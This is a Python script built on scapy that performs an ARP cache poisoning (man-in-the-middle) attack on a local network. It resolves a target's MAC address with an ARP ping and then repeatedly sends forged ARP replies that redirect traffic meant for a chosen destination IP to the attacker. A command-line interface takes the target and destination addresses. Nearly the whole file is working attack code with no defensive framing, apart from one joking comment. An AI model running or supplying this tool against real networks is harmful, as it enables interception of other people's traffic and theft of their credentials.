# coding: utf8
# vi: ft=python expandtab ts=4 sts=4 sw=4

import time
import logging
import argparse

_log = logging.getLogger(__file__)

try:
    from scapy.all import *
    from rich.console import Console
    from rich.logging import RichHandler
except ImportError as exc:
    _log.fatal(
        "You need scapy to run this program "
        "run this command: sudo python3 -m pip install -r requirements.txt"
    )


def ping_arp4(dst: str) -> str:
    """Simple ICMPv4 ping using scapy

    Args:
        dst (str): The destination IPv4
    Return:
        str: Destination MAC address, None if there is no response
    """
    mac_address = None

    # Craft ARP frame : classic ARP request
    # Send ARP request and store ARP reply
    # It contains the MAC address of the target as the MAC source
    ans = sr1(ARP(op=1, pdst=dst), verbose=False, timeout=1)

    if ans is not None:
        # Extract MAC address from received ARP reply
        mac_address = ans[ARP].hwsrc
    if mac_address is not None:
        _log.info(f"ARP ping: {dst} has {mac_address}")
    else:
        _log.info(
            f"[bold red]{dst} did not reply to ARP request[/bold red]",
            extra={"markup": True}
        )
    return mac_address


class ARPSpoofing:
    ''' Try an ARP spoof attack on given 'target', spoofing a given
        'destination' address. 'target' and 'destination' refers to traditional use
        of ARP poisoning, but can be any valid IPv4 addresses.

        Args:
            target: IPv4 address of the target
            destination: IPv4 address to spoof

        Returns:
            True if the attack has succeeded.
            (ptdr return True tout le temps en fait 😊)

        Examples:
            Spoof a supposed destination holding IP 172.18.0.254 :

            >>> arpspoof('172.18.0.1', '172.18.0.254')
            True
    '''
    def __init__(self, target, destination):
        self.target = target
        self.destination = destination
        self.target_mac = None

    def __call__(self):
        if self.target_mac is None:
            self.target_mac = ping_arp4(self.target)
        if self.target_mac is not None:
            arp = ARP()
            arp.pdst = self.target
            arp.psrc = self.destination
            arp.hwdst = self.target_mac
            result, unans = sr(arp, timeout=2, verbose=0)
            _log.info(
                "Traffic meant for %s from %s sent to attacker.",
                self.destination, self.target
            )
        else:
            _log.warning("Could not retrieve %s mac address", self.target)


def mitm(target, destination, interval=1):
    try:
        spoof = ARPSpoofing(target, destination)

        while True:
            spoof()
            time.sleep(1)
    except KeyboardInterrupt:
        return


if __name__ == "__main__":
    FORMAT = "%(message)s"
    logging.basicConfig(
        level=logging.DEBUG, format=FORMAT, datefmt="[%X]", handlers=[RichHandler()]
    )

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "target", type=str,
        help=(
            "The target IPv4 address used example: 192.168.1.1"
        )
    )
    parser.add_argument(
        "destination", type=str,
        help=(
            "The destination IPv4 address that will replace the target "
            "address using ARP cache poisoning example: 192.168.1.2"
        )
    )
    args = parser.parse_args()

    console = Console()

    mitm(args.target, args.destination)
